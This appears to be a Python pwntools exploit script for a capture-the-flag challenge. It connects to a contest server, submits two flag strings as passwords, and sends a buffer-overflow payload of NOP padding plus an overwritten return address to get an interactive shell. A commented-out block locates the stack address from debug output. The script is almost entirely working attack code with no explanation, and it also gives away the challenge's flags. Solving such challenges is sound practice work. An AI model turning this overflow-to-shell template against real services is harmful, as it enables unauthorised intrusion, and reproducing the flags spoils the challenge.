from pwn import *
import struct

def readall(conn):
    s = ''
    while True:
        line = conn.readline(timeout=1)
        if not line:
            break
        s += line
    return s 

def writeall(conn, data):
    print data
    conn.sendline(data)

def talk(conn, data):
    writeall(conn, data)
    res = readall(conn)
    return res

conn = remote('mngmnt-iface.ctfcompetition.com', 1337)

print talk(conn, '1')
print talk(conn, 'CTF{I_luv_buggy_sOFtware}')
print talk(conn, 'CTF{Two_PasSworDz_Better_th4n_1_k?}')
"""
data = talk(conn, 'debug')


for line in data.split('\n'):
    if '[stack]' in line:
        break
stack_start = int(line.split('-')[0], 16)
print 'found stack addr: ', stack_start
addr_start = stack_start + 0xE0
"""

shell_addr = 0x41414349
payload =  '\x90' * 56 + struct.pack('<Q', shell_addr)
conn.sendline(payload)
conn.interactive()
